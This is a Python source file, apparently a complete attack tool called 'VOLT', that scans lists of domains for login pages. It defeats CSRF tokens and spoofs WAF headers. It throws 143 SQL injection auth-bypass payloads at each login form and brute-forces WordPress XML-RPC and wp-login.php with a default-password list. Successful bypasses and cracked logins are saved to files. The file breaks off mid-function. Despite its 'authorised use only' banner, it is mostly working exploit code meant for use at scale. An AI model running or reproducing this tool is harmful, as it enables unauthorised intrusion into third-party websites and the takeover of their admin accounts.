#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#  VOLT  ·  By Santonu Halder
#  ⚠  Authorised penetration testing & security research only  ⚠
#

import sys, os, re, time, threading, xml.etree.ElementTree as ET
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3, warnings

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

THREADS         = 100
TIMEOUT_CONNECT = 6
TIMEOUT_READ    = 15
MAX_RETRIES     = 1
VALID_FILE      = "Valid.txt"
WP_FILE         = "WP_Successful.txt"

class C:
    RST  = "\033[0m";  BLD = "\033[1m";  DIM = "\033[2m"
    RED  = "\033[91m"; YEL = "\033[93m"; WHT = "\033[97m"
    E1   = "\033[38;5;51m";   E2  = "\033[38;5;45m"
    E3   = "\033[38;5;39m";   E4  = "\033[38;5;33m"
    E5   = "\033[38;5;27m";   LIME= "\033[38;5;118m"
    PURP = "\033[38;5;135m";  GOLD= "\033[38;5;220m"
    ORNG = "\033[38;5;208m";  GREY= "\033[38;5;244m"
    DKGR = "\033[38;5;238m"

def print_banner() -> None:
    r = C.RST
    print(f"""
{C.E1}  ──────────────────────────────────────────────────────────────────{r}

{C.E1}{C.BLD}  ██╗   ██╗ ██████╗ ██╗  ████████╗{r}
{C.E2}{C.BLD}  ██║   ██║██╔═══██╗██║     ██║   {r}
{C.E3}{C.BLD}  ██║   ██║██║   ██║██║     ██║   {r}
{C.E4}{C.BLD}  ╚██╗ ██╔╝██║   ██║██║     ██║   {r}
{C.E5}{C.BLD}   ╚████╔╝ ╚██████╔╝███████╗██║   {r}
{C.DKGR}{C.BLD}    ╚═══╝   ╚═════╝ ╚══════╝╚═╝   {r}

{C.DKGR}  ──────────────────────────────────────────────────────────────────{r}
{C.E1}  ◆{r}  {C.GREY}Engine  {r}  {C.WHT}Web Authentication Assessment  ·  v6.0{r}
{C.E1}  ◆{r}  {C.GREY}Primary {r}  {C.ORNG}SQLi Auth Bypass  ·  143 Payloads  ·  WAF Evasion{r}
{C.E1}  ◆{r}  {C.GREY}WP      {r}  {C.PURP}XML-RPC Brute  →  wp-login.php Brute (fallback){r}
{C.E1}  ◆{r}  {C.GREY}Output  {r}  {C.E2}Valid.txt{r}  ·  {C.E2}WP_Successful.txt{r}
{C.DKGR}  ──────────────────────────────────────────────────────────────────{r}
{C.DIM}  ⚠  Authorised penetration testing use only  ⚠{r}
{C.DKGR}  ──────────────────────────────────────────────────────────────────{r}
{C.E1}  ◆{r}  {C.GREY}Author  {r}  {C.WHT}Santonu Halder{r}
{C.E1}  ◆{r}  {C.GREY}GitHub  {r}  {C.E2}https://github.com/santonuhalder{r}
{C.DKGR}  ──────────────────────────────────────────────────────────────────{r}
""")

_print_lock = threading.Lock()
_valid_lock = threading.Lock()
_wp_lock    = threading.Lock()
_stats_lock = threading.Lock()
_stats = {"domains":0,"dead":0,"no_form":0,"sqli":0,"xmlrpc":0,"wp_login":0}

_KIND = {
    "info"  :(C.E2,   "◆"), "wp"    :(C.PURP, "◆"),
    "alive" :(C.E1,   "⚡"), "brute" :(C.YEL,  "▶"),
    "sqli"  :(C.ORNG, "↯"), "ok"    :(C.LIME, "✔"),
    "fail"  :(C.RED,  "✘"), "dead"  :(C.DKGR, "○"),
    "noform":(C.GREY, "◇"), "warn"  :(C.YEL,  "!"),
    "spider":(C.E2,   "⟳"),
}

def vprint(domain:str, status:str, kind:str="info") -> None:
    col, icon = _KIND.get(kind,(C.GREY,"·"))
    host = domain.replace("https://","").replace("http://","").rstrip("/")[:55]
    with _print_lock:
        print(
            f"  {col}[{icon}]{C.RST}  "
            f"{C.WHT}{host:<55}{C.RST}  "
            f"{C.DKGR}->{C.RST}  "
            f"{col}[{status}]{C.RST}",
            flush=True,
        )

def _init_files() -> None:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    for path, hdr in (
        (VALID_FILE, f"# VOLT  ·  SQLi Results  ·  {ts}"),
        (WP_FILE,    f"# VOLT  ·  WordPress Results  ·  {ts}"),
    ):
        if not os.path.exists(path):
            with open(path,"w",encoding="utf-8") as f:
                f.write(hdr+"\n"+"─"*60+"\n")

def save_sqli(login_url:str, u:str, p:str) -> None:
    with _valid_lock:
        with open(VALID_FILE,"a",encoding="utf-8") as f:
            f.write(f'{login_url}    |    "{u}"    |    "{p}"\n')

def save_wp(domain:str, user:str, passw:str) -> None:
    host = domain.replace("https://","").replace("http://","").rstrip("/")
    with _wp_lock:
        with open(WP_FILE,"a",encoding="utf-8") as f:
            f.write(f"{host}/wp-login.php#{user}@{passw}\n")

_UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
]
_ua_idx=0; _ua_lock=threading.Lock()

def _next_ua() -> str:
    global _ua_idx
    with _ua_lock:
        ua = _UA_LIST[_ua_idx % len(_UA_LIST)]
        _ua_idx += 1
        return ua

_WAF_HEADERS = {
    "X-Forwarded-For":"127.0.0.1","X-Real-IP":"127.0.0.1",
    "X-Originating-IP":"127.0.0.1","CF-Connecting-IP":"127.0.0.1",
    "True-Client-IP":"127.0.0.1","X-Client-IP":"127.0.0.1",
    "Forwarded":"for=127.0.0.1;host=localhost;proto=https",
    "X-Host":"localhost","X-Custom-IP-Authorization":"127.0.0.1",
}

def make_session() -> requests.Session:
    s = requests.Session()
    retry = Retry(total=MAX_RETRIES, backoff_factor=0.1,
                  status_forcelist=[500,502,503,504],
                  allowed_methods=["GET","POST","HEAD"],
                  raise_on_status=False)
    adp = HTTPAdapter(max_retries=retry, pool_connections=4, pool_maxsize=8)
    s.mount("https://",adp); s.mount("http://",adp)
    s.headers.update({
        "User-Agent":_next_ua(), "Accept":"text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language":"en-US,en;q=0.9", "Accept-Encoding":"gzip, deflate, br",
        "Connection":"keep-alive", "Cache-Control":"no-cache", **_WAF_HEADERS,
    })
    return s

def normalize(raw:str):
    raw = raw.strip().rstrip("/")
    if not raw or raw.startswith("#"): return None
    if not raw.startswith(("http://","https://")): raw = "https://"+raw
    return raw

def base_url(url:str) -> str:
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"

def _striptags(html:str) -> str:
    return re.sub(r"<[^>]+>"," ",html)

def is_alive(s:requests.Session, bu:str) -> bool:
    urls = [bu] + (["http://"+bu[8:]] if bu.startswith("https://") else [])
    for url in urls:
        try:
            r = s.head(url, timeout=(TIMEOUT_CONNECT, TIMEOUT_READ),
                       verify=False, allow_redirects=True)
            if r.status_code < 600:
                return True
        except Exception:
            pass
    return False

LOGIN_PATHS = [
    "/wp-login.php","/wp-admin/","/wp-admin/index.php",
    "/administrator/","/administrator/index.php",
    "/admin/","/admin/login","/admin/login.php","/admin/index.php",
    "/admin/account.php","/admin/admin.php","/admin/adminLogin.php",
    "/login","/login.php","/login.aspx","/login.asp","/login.cfm",
    "/signin","/sign-in","/sign_in",
    "/auth/login","/auth/signin",
    "/user/login","/user/signin",
    "/users/sign_in","/users/login",
    "/account/login","/account/signin",
    "/member/login","/members/login","/member/signin",
    "/secure/login","/portal/login",
    "/panel/login","/cpanel/login","/cpanel/",
    "/webadmin/","/webadmin/index.php",
    "/customer/account/login","/store/account/login","/shop/my-account/",
    "/index.php?option=com_users&view=login","/index.php/login",
    "/backend/","/backend/login","/manage/","/manage/login",
    "/cms/","/cms/login","/cms/admin",
    "/system/login","/system/admin","/site/login","/site/admin",
    "/web/login","/web/admin","/app/login","/app/admin","/api/login",
    "/console/","/console/login","/control/","/control/login",
    "/dashboard/","/dashboard/login","/office/","/office/login",
    "/staff/","/staff/login","/intranet/","/intranet/login",
    "/extranet/","/extranet/login",
    "/siteadmin/","/siteadmin/login.php",
    "/moderator/","/moderator/login.php",
    "/webmaster/","/webmaster/login.php","/supervisor/",
    "/acceso","/acceso.php","/entrar","/entrar.php",
    "/connexion","/connexion.php",
    "/login/index.php","/login/admin.php",
    "/?page=login","/?p=login","/?q=login",
    "/forum/login.php","/board/login.php","/blog/wp-login.php",
    "/user","/users","/profile","/myaccount","/?login",
    "/authenticate","/session/new","/sessions/new",
    "/login/","/admin/user/login","/admin/users/login",
    "/admin/account","/users/login",
]

class FormParser:
    _USER_KEYS = frozenset({
        "user","login","email","mail","name","account","log","uname","uid",
        "usr","username","memberid","member","userid","user_name","user_login",
        "loginid","signin","logon","identifier","credential","phone","mobile",
        "tel","number","nick","handle","alias","screenname",
    })
    _PASS_KEYS = frozenset({
        "pass","pwd","passwd","secret","psw","pword","password","passw",
        "passwrd","pin","code","key","auth","cred","mot_de_passe",
    })

    _FORM_OPEN  = re.compile(r"<form\b([^>]*)>",   re.I|re.S)
    _FORM_CLOSE = re.compile(r"</form\s*>",          re.I)
    _INPUT      = re.compile(r"<input\b([^>]*)>",   re.I|re.S)
    _SELECT     = re.compile(r"<select\b([^>]*)>",  re.I|re.S)
    _TEXTAREA   = re.compile(r"<textarea\b([^>]*)>",re.I|re.S)
    _ATTR       = re.compile(
        r"""(\w[\w:-]*)=(?:"([^"]*?)"|'([^']*?)'|([^\s>/"']+))""",re.I)
    _LABEL      = re.compile(
        r"<label\b[^>]*for=[\"']?([^\"'\s>]+)[\"']?[^>]*>(.*?)</label>",
        re.I|re.S)

    def parse(self, html:str, page_url:str) -> list:
        label_map = {
            m.group(1).lower(): _striptags(m.group(2)).lower()
            for m in self._LABEL.finditer(html)
        }
        results = []
        opens  = list(self._FORM_OPEN.finditer(html))
        closes = [m.start() for m in self._FORM_CLOSE.finditer(html)]
        for om in opens:
            start = om.end()
            end   = next((c for c in closes if c > start), len(html))
            info  = self._parse_form(html[start:end], om.group(1),
                                     page_url, label_map)
            if info: results.append(info)
        if not results:
            fb = self._raw_scan(html, page_url, label_map)
            if fb: results.append(fb)
        return results

    def _parse_form(self, body, attrs, page_url, lmap):
        fields = {}; u_f = p_f = None
        all_inp = (list(self._INPUT.finditer(body))
                  +list(self._SELECT.finditer(body))
                  +list(self._TEXTAREA.finditer(body)))
        for m in all_inp:
            a     = self._attrs(m.group(1))
            ftype = a.get("type","text").lower()
            name  = a.get("name",""); fid = a.get("id","")
            key   = name or fid
            if not key: continue
            fields[key] = a.get("value","")
            nl = name.lower(); il = fid.lower()
            ph = a.get("placeholder","").lower()
            ac = a.get("autocomplete","").lower()
            lbl= lmap.get(il,"") or lmap.get(nl,"")

            ip = (ftype=="password"
                  or ac in ("current-password","new-password","password")
                  or any(k in t for t in (nl,il,ph,lbl) for k in self._PASS_KEYS))
            iu = (ftype=="email" or ac in ("username","email")
                  or any(k in t for t in (nl,il,ph,lbl) for k in self._USER_KEYS))

            if ip and not p_f: p_f = key
            if iu and not u_f: u_f = key

        if not (u_f and p_f): return None
        return {
            "login_url": page_url,
            "action_url":self._action(attrs,page_url),
            "method":    self._method(attrs),
            "fields":    fields,
            "u_field":   u_f,
            "p_field":   p_f,
        }

    def _raw_scan(self, html, page_url, lmap):
        for pm in re.finditer(
            r"<input\b([^>]*\btype\s*=\s*[\"']?password[\"']?[^>]*)>",html,re.I):
            a   = self._attrs(pm.group(1))
            p_f = a.get("name","") or a.get("id","")
            if not p_f: continue
            win = html[max(0,pm.start()-3000):pm.start()]
            for um in reversed(list(self._INPUT.finditer(win))):
                ua   = self._attrs(um.group(1))
                utyp = ua.get("type","text").lower()
                unm  = ua.get("name","") or ua.get("id","")
                if utyp=="hidden" or not unm: continue
                if (any(k in unm.lower() for k in self._USER_KEYS)
                        or utyp in ("text","email")):
                    fields = {}
                    for m2 in self._INPUT.finditer(html):
                        a2=self._attrs(m2.group(1)); n2=a2.get("name","")
                        if n2: fields[n2]=a2.get("value","")
                    return {"login_url":page_url,"action_url":page_url,
                            "method":"POST","fields":fields,
                            "u_field":unm,"p_field":p_f}
        return None

    def _attrs(self,s):
        return {k.lower():(v1 or v2 or v3 or "")
                for k,v1,v2,v3 in self._ATTR.findall(s)}

    def _action(self,attrs,page_url):
        m=re.search(r"""\baction\s*=\s*(?:"([^"]*?)"|'([^']*?)'|([^\s>/"']+))""",
                    attrs,re.I)
        if m:
            raw=(m.group(1) or m.group(2) or m.group(3) or "").strip()
            if raw and raw not in ("#","javascript:void(0)"):
                if raw.startswith("http"): return raw
                if raw.startswith("/"): return base_url(page_url)+raw
                return page_url.rsplit("/",1)[0]+"/"+raw
        return page_url

    def _method(self,attrs):
        m=re.search(r"""\bmethod\s*=\s*(?:"([^"]*?)"|'([^']*?)'|([^\s>/"']+))""",
                    attrs,re.I)
        if m:
            v=(m.group(1) or m.group(2) or m.group(3) or "POST").strip().upper()
            return v if v in ("POST","GET") else "POST"
        return "POST"

_LOGIN_LINK_RE = re.compile(
    r"""href=['"]((?:https?://[^'"]*)?/?[^'"]*(?:login|signin|sign-in|
    log-in|logon|auth|account|member|user|admin|portal|panel|dashboard|
    session)[^'"]{0,80})['"]""",
    re.I|re.X,
)
_REDIRECT_RE = re.compile(
    r"""(?:next|redirect|return|returnUrl|goto|url)=['""]?
    ([^'"&\s]{4,120})""",
    re.I|re.X,
)

class LoginFinder:
    def __init__(self, session):
        self.s = session
        self.p = FormParser()

    def find(self, bu:str):
        for path in LOGIN_PATHS:
            info = self._probe(bu+path)
            if info: return info

        try:
            r = self.s.get(bu, timeout=(TIMEOUT_CONNECT,TIMEOUT_READ),
                           verify=False, allow_redirects=True)
            if r.status_code == 200:
                forms = self.p.parse(r.text, r.url)
                if forms: return forms[0]
                seen = set()
                for m in _LOGIN_LINK_RE.finditer(r.text):
                    href = m.group(1).strip()
                    if not href.startswith("http"):
                        href = urljoin(bu+"/", href)
                    href = href.split("?")[0].split("#")[0].rstrip("/")
                    if href in seen or base_url(href) != bu: continue
                    seen.add(href)
                    info = self._probe(href)
                    if info: return info
                    if len(seen) >= 15: break

                for m in _REDIRECT_RE.finditer(r.text):
                    path2 = m.group(1).strip()
                    if not path2.startswith("http"):
                        path2 = urljoin(bu+"/", path2)
                    if base_url(path2) != bu: continue
                    info = self._probe(path2)
                    if info: return info
        except Exception:
            pass

        return None

    def _probe(self, url:str):
        try:
            r = self.s.get(url, timeout=(TIMEOUT_CONNECT,TIMEOUT_READ),
                           verify=False, allow_redirects=True)
            if r.status_code == 200:
                forms = self.p.parse(r.text, r.url)
                if forms: return forms[0]
        except Exception:
            pass
        return None

_CSRF_NAMES = frozenset({
    "_token","csrf","csrf_token","csrftoken","_csrf","authenticity_token",
    "__requestverificationtoken","xsrf_token","_xsrf","token",
    "form_token","form_key","nonce","_wpnonce","security",
})

class CsrfRefresher:
    def __init__(self, session:requests.Session):
        self.s = session

    def refresh(self, form:dict) -> dict:
        """
        Fetch the login page fresh, re-extract CSRF/hidden tokens,
        merge them into form['fields'].  Returns updated form dict.
        """
        try:
            r = self.s.get(
                form["login_url"],
                timeout=(TIMEOUT_CONNECT, TIMEOUT_READ),
                verify=False, allow_redirects=True,
            )
            if r.status_code != 200:
                return form
            for m in re.finditer(r"<input\b([^>]*)>", r.text, re.I|re.S):
                a     = {}
                for km in re.finditer(
                    r"""(\w[\w:-]*)=(?:"([^"]*?)"|'([^']*?)'|([^\s>/"']+))""",
                    m.group(1), re.I
                ):
                    a[km.group(1).lower()] = (km.group(2) or km.group(3)
                                              or km.group(4) or "")
                ftype = a.get("type","text").lower()
                name  = a.get("name","").lower()
                val   = a.get("value","")
                if ftype=="hidden" and name in _CSRF_NAMES:
                    for k in form["fields"]:
                        if k.lower() == name:
                            form["fields"][k] = val
                            break
                    else:
                        form["fields"][name] = val
        except Exception:
            pass
        return form

SQLI_PAYLOADS = [
    ("' OR '1'='1",                            "' OR '1'='1"),
    ("' OR '1'='1'--",                         "' OR '1'='1'--"),
    ("' OR '1'='1'#",                          "' OR '1'='1'#"),
    ("' OR '1'='1'/*",                         "' OR '1'='1'/*"),
    ("' OR 1=1--",                             "' OR 1=1--"),
    ("' OR 1=1#",                              "' OR 1=1#"),
    ("' OR 1=1/*",                             "x"),
    ("' OR 1=1;--",                            "x"),
    ("OR 1=1--",                               "OR 1=1--"),
    ("' OR 'x'='x",                            "' OR 'x'='x"),
    ("' OR 'x'='x'--",                         "x"),
    ("' OR 'x'='x'#",                          "x"),
    ("' OR 'a'='a",                            "' OR 'a'='a"),
    ("' OR 'a'='a'--",                         "x"),
    ("' OR ''='",                              "' OR ''='"),
    ("' OR ''=''--",                           "x"),
    ("1' OR '1'='1",                           "1' OR '1'='1"),
    ("1 OR 1=1--",                             "x"),
    ("' OR 2>1--",                             "x"),
    ("' OR 3=3--",                             "x"),
    ("admin'--",                               "x"),
    ("admin'#",                                "x"),
    ("admin'/*",                               "x"),
    ("admin' OR '1'='1'--",                    "x"),
    ("admin' OR '1'='1'#",                     "x"),
    ("admin' OR 1=1--",                        "x"),
    ("admin' OR 1=1#",                         "x"),
    ("admin'-- -",                             "x"),
    ("admin' -- -",                            "x"),
    ("admin'--\n",                             "x"),
    ("administrator'--",                       "x"),
    ("root'--",                                "x"),
    ("sa'--",                                  "x"),
    ("' OR username IS NOT NULL--",            "x"),
    ("' OR userid IS NOT NULL--",              "x"),
    ("') OR ('1'='1",                          "') OR ('1'='1"),
    ("') OR ('1'='1'--",                       "x"),
    ("') OR 1=1--",                            "') OR 1=1--"),
    ("') OR 1=1#",                             "') OR 1=1#"),
    ("')) OR (('1'='1",                        "')) OR (('1'='1"),
    ("' OR (1=1)--",                           "x"),
    ("' OR (1=1)#",                            "x"),
    ("admin') OR ('1'='1'--",                  "x"),
    ("admin')) OR (('1'='1'--",                "x"),
    ('" OR "1"="1"--',                         '" OR "1"="1"--'),
    ('" OR "1"="1"#',                          '" OR "1"="1"#'),
    ('" OR 1=1--',                             '" OR 1=1--'),
    ('" OR 1=1#',                              '" OR 1=1#'),
    ('admin"--',                               "x"),
    ('admin"#',                                "x"),
    ('" OR "x"="x',                            '" OR "x"="x'),
    ('") OR ("1"="1"--',                       "x"),
    ('") OR 1=1--',                            "x"),
    ('")) OR (("1"="1"--',                     "x"),
    ("' /*!OR*/ '1'='1'--",                    "x"),
    ("' /*!50000OR*/ 1=1--",                   "x"),
    ("' OR 1=1 LIMIT 1--",                     "x"),
    ("' OR 1=1 LIMIT 1#",                      "x"),
    ("' OR 1 LIKE 1--",                        "x"),
    ("' OR 1 LIKE 1#",                         "x"),
    ("' OR 1=1 ORDER BY 1--",                  "x"),
    ("' OR MID(1,1,1)=1--",                    "x"),
    ("' OR ASCII(1)=49--",                     "x"),
    ("' OR SLEEP(0)--",                        "x"),
    ("' OR IF(1=1,1,0)--",                     "x"),
    ("' OR FIELD(1,1)=1--",                    "x"),
    ("'; IF(1=1) WAITFOR DELAY '0:0:0'--",     "x"),
    ("' OR 1=CONVERT(INT,'1')--",              "x"),
    ("' OR LEN('')=0--",                       "x"),
    ("' OR SYSTEM_USER LIKE '%'--",            "x"),
    ("' OR @@VERSION IS NOT NULL--",           "x"),
    ("' OR 1=1; SELECT 1--",                   "x"),
    ("' OR '1'='1' FROM DUAL--",               "x"),
    ("admin'||'--",                            "x"),
    ("' OR ROWNUM=1--",                        "x"),
    ("' OR SYSDATE IS NOT NULL--",             "x"),
    ("' OR LENGTH('')=0--",                    "x"),
    ("'; SELECT 1--",                          "x"),
    ("' OR TRUE--",                            "x"),
    ("' OR TRUE#",                             "x"),
    ("admin'::text--",                         "x"),
    ("' OR pg_sleep(0) IS NOT NULL--",         "x"),
    ("' OR version() IS NOT NULL--",           "x"),
    ("' OR sqlite_version() IS NOT NULL--",    "x"),
    ("admin'||hex('')--",                      "x"),
    ("' %4fR '1'='1'--",                       "x"),
    ("' %6fR '1'='1'--",                       "x"),
    ("%27%20OR%20%271%27%3D%271",              "x"),
    ("%27+OR+%271%27%3D%271",                  "x"),
    ("'%20OR%20'1'='1'--",                     "x"),
    ("%27%20OR%201%3D1--",                     "x"),
    ("'%09OR%09'1'='1'--",                     "x"),
    ("'%0aOR%0a'1'='1'--",                     "x"),
    ("'%0dOR%0d'1'='1'--",                     "x"),
    ("'%0bOR%0b1=1--",                         "x"),
    ("'%0cOR%0c1=1--",                         "x"),
    ("'/**/OR/**/'1'='1'--",                   "x"),
    ("'/**/OR/**/1=1--",                       "x"),
    ("'/*!OR*/ 1=1--",                         "x"),
    ("'/*!50000OR*/ 1=1--",                    "x"),
    ("'/*comment*/OR/*comment*/'1'='1'--",     "x"),
    ("'/*x*/OR/*x*/1=1--",                     "x"),
    ("admin'/**/--",                           "x"),
    ("admin'/*!--*/",                          "x"),
    ("'/*a*/OR/*b*/1=1/*c*/--",               "x"),
    ("' oR '1'='1'--",                         "x"),
    ("' Or '1'='1'--",                         "x"),
    ("' oR 1=1--",                             "x"),
    ("' Or 1=1--",                             "x"),
    ("' oR 1=1#",                              "x"),
    ("aDmIn'--",                               "x"),
    ("' Or/**/1=1--",                          "x"),
    ("'\tOR\t'1'='1'--",                       "x"),
    ("'\nOR\n'1'='1'--",                       "x"),
    ("'\rOR\r'1'='1'--",                       "x"),
    ("'\r\nOR\r\n1=1--",                       "x"),
    ("' OR\t1=1--",                            "x"),
    ("' OR\n1=1--",                            "x"),
    ("'||'OR'||'1'='1'--",                     "x"),
    ("CONCAT(0x27,0x4f52,0x20,0x31,0x3d,0x31)","x"),
    ("CHAR(39,79,82,32,49,61,49)",             "x"),
    ("0x27204f52203127203d20273127--",         "x"),
    ("' UNION SELECT 1--",                     "x"),
    ("' UNION SELECT NULL--",                  "x"),
    ("' UNION SELECT 1,1--",                   "x"),
    ("' UNION SELECT 1,2,3--",                 "x"),
    ("' UNION SELECT 1,NULL,NULL--",           "x"),
    ("' UNION ALL SELECT 1--",                 "x"),
    ("' UNION SELECT 'admin','admin'--",       "admin"),
    ("' UNION SELECT NULL,NULL,NULL--",        "x"),
    ("' UNION/**/SELECT/**/1--",               "x"),
    ("' AND 1=1--",                            "' AND 1=1--"),
    ("' AND '1'='1",                           "' AND '1'='1"),
    ("' AND 1=1#",                             "x"),
    ("' AND 2=2--",                            "x"),
    ("' AND 'x'='x'--",                        "x"),
    ("'; SELECT * FROM users WHERE '1'='1",    "x"),
    ("'; EXEC sp_password NULL,'new','sa'--",   "x"),
    ("1; SELECT 1--",                          "x"),
]

_FAIL_RE = re.compile(
    r"(invalid\s+(?:user|pass|cred|log)|wrong\s+(?:user|pass|cred|log)|"
    r"incorrect\s+(?:user|pass|cred|log)|login\s+fail|sign[\s-]?in\s+fail|"
    r"authentication\s+fail|auth(?:entication)?\s+error|"
    r"bad\s+(?:user|pass|cred|log)|unknown\s+user|no\s+such\s+user|"
    r"user\s+not\s+found|(?:pass|password)\s+(?:is\s+)?(?:wrong|bad|invalid|incorrect|mismatch)|"
    r"login\s+error|sign[\s-]?in\s+error|access\s+denied|"
    r"account\s+(?:not\s+found|blocked|disabled|locked)|"
    r"too\s+many\s+(?:attempts|tries|logins)|try\s+again|"
    r"could\s+not\s+log|unable\s+to\s+log|lost your password|"
    r"forgot\s+(?:your\s+)?password|"
    r"<p[^>]*class=[^>]*error[^>]*>|"
    r"<div[^>]*class=[^>]*(?:alert|error|warning|danger)[^>]*>)",
    re.I,
)
_OK_URL_RE = re.compile(
    r"/(wp-admin|dashboard|admin(?:istrat(?:or|ion))?|panel|home|"
    r"profile|account|members|manage|portal|cpanel|backend|"
    r"controlpanel|myaccount|console|staff|intranet)",
    re.I,
)
_OK_BODY_RE = re.compile(
    r"\b(log[\s_-]?out|sign[\s_-]?out|dashboard|welcome\s+back|"
    r"my\s+account|administrator|admin\s+panel|site\s+health|"
    r"appearance|add\s+new\s+plugin|plugins|wp_nonce|"
    r"edit\s+profile|user\s+profile|control\s+panel|"
    r"management\s+console|logged\s+in|you\s+are\s+logged|"
    r"access\s+granted|successfully\s+logged|"
    r"hello,?\s+admin|welcome,?\s+admin)\b",
    re.I,
)
_AUTH_CK_RE = re.compile(
    r"(session|auth|token|logged|user[\-_]?id|admin|"
    r"wordpress[\-_]logged|phpsessid|jsessionid|"
    r"asp\.net[\-_]sessionid|laravel[\-_]session|"
    r"ci[\-_]session|csrf|xsrf)",
    re.I,
)

class SQLInjector:
    def __init__(self, session):
        self.s     = session
        self.csrf  = CsrfRefresher(session)

    def test(self, form:dict):
        action = form["action_url"]
        u_f    = form["u_field"]
        p_f    = form["p_field"]
        method = form.get("method","POST").upper()
        bu     = base_url(action)

        form = self.csrf.refresh(form)
        fields = form["fields"]

        baseline = self._send(action, method, fields, u_f, p_f,
                              "invalid_xyz987@x.zz", "invalid_xyz987!")
        if baseline is None:
            return None

        fail_sig   = self._fail_sig(baseline)
        base_len   = len(baseline.text)
        base_cks   = {c.name for c in baseline.cookies}
        base_url_  = baseline.url

        for u_pay, p_pay in SQLI_PAYLOADS:
            form   = self.csrf.refresh(form)
            fields = form["fields"]

            resp = self._send(action, method, fields, u_f, p_f, u_pay, p_pay)
            if resp is None:
                continue

            score = self._score(resp, baseline, fail_sig,
                                base_len, base_cks, base_url_, bu)
            if score >= 2:
                return {"username": u_pay, "password": p_pay,
                        "url": action, "login_url": form["login_url"]}
        return None

    def _send(self, action, method, fields, u_f, p_f, u_v, p_v):
        data = fields.copy()
        data[u_f] = u_v
        data[p_f] = p_v
        try:
            if method == "GET":
                return self.s.get(action, params=data,
                                  timeout=(TIMEOUT_CONNECT,TIMEOUT_READ+4),
                                  verify=False, allow_redirects=True)
            return self.s.post(action, data=data,
                               timeout=(TIMEOUT_CONNECT,TIMEOUT_READ+4),
                               verify=False, allow_redirects=True)
        except Exception:
            return None

    def _fail_sig(self, r):
        sigs = set()
        for m in _FAIL_RE.finditer(r.text.lower()):
            sigs.add(m.group(0)[:40])
        sigs.add(urlparse(r.url).path.lower())
        return frozenset(sigs)

    def _score(self, resp, baseline, fail_sig,
               base_len, base_cks, base_url_, bu) -> int:
        """
        Multi-signal scoring.
        Each independent signal = +1 point.
        Require >= 2 to confirm (prevents single-signal false positives).
        Hard-fail signals immediately return 0.
        """
        if _FAIL_RE.search(resp.text):
            return 0
        if resp.url == base_url_:
            if self._fail_sig(resp) & fail_sig:
                return 0

        score = 0
        url_l = resp.url.lower()

        if _OK_URL_RE.search(resp.url):
            score += 2   # strong signal — counts double

        if (resp.url != base_url_
                and "login" not in url_l and "signin" not in url_l
                and "sign-in" not in url_l and "error" not in url_l
                and resp.status_code < 400):
            score += 1

        for ck in resp.cookies:
            if ck.name not in base_cks and _AUTH_CK_RE.search(ck.name):
                score += 2   # auth cookie = strong signal
                break

        if ("login" not in url_l and "signin" not in url_l
                and _OK_BODY_RE.search(resp.text)):
            score += 1

        if score >= 1:
            for path in ("/wp-admin/","/admin/","/administrator/",
                         "/dashboard","/panel"):
                try:
                    r2 = self.s.get(bu+path,
                                    timeout=(TIMEOUT_CONNECT,TIMEOUT_READ),
                                    verify=False, allow_redirects=True)
                    if r2.status_code==200 and _OK_BODY_RE.search(r2.text):
                        score += 2
                        break
                except Exception:
                    continue

        return score

WP_CREDS = [
    ("admin","admin"),("admin","password"),("admin","123456"),
    ("admin","admin123"),("admin","wordpress"),("admin","pass"),
    ("admin","letmein"),("admin","qwerty"),("admin","abc123"),
    ("admin","master"),("admin","passw0rd"),("admin","P@ssw0rd"),
    ("admin","Admin@123"),("admin","admin@123"),("admin","Welcome1"),
    ("admin","changeme"),("admin","secret"),("admin","1234"),
    ("admin","12345"),("admin","123456789"),("admin",""),
    ("admin","admin1"),("admin","dragon"),("admin","monkey"),
    ("admin","sunshine"),("admin","football"),("admin","princess"),
    ("admin","iloveyou"),("admin","shadow"),("admin","superman"),
    ("admin","michael"),("admin","batman"),("admin","master123"),
    ("admin","admin2024"),("admin","admin2023"),("admin","admin@2024"),
    ("admin","admin@2023"),("admin","root"),("admin","toor"),
    ("administrator","admin"),("administrator","password"),
    ("administrator","administrator"),("administrator","123456"),
    ("administrator","admin123"),
    ("root","root"),("root","toor"),("root","password"),
    ("root","admin"),("root","123456"),
    ("user","user"),("user","password"),("user","123456"),
    ("test","test"),("test","password"),("test","123456"),
    ("webmaster","webmaster"),("webmaster","admin"),("webmaster","password"),
    ("wp","wp"),("wordpress","wordpress"),
    ("manager","manager"),("manager","password"),("manager","admin"),
    ("support","support"),("support","password"),
    ("editor","editor"),("editor","password"),
    ("demo","demo"),("guest","guest"),
]

class WordPressEngine:
    _WP_SIG_RE = re.compile(
        r"(wp-content|wp-includes|wordpress|/wp-json|"
        r"generator.*?WordPress|wp-embed\.min\.js)",
        re.I,
    )
    _XMLRPC_ENABLED = re.compile(
        r"<string>system\.listMethods</string>|"
        r"<string>wp\.getUsersBlogs</string>|"
        r"<string>demo\.sayHello</string>",
        re.I,
    )
    _WP_FAIL_RE = re.compile(
        r'id=["\']login_error["\']|'
        r"incorrect\s+password|incorrect\s+username|"
        r"invalid\s+username|invalid\s+email|"
        r"the\s+password\s+you\s+entered|"
        r"unknown\s+username|error\s+in\s+login|"
        r"<strong>Error</strong>",
        re.I,
    )

    def __init__(self, session):
        self.s = session

    def is_wordpress(self, bu:str) -> bool:
        try:
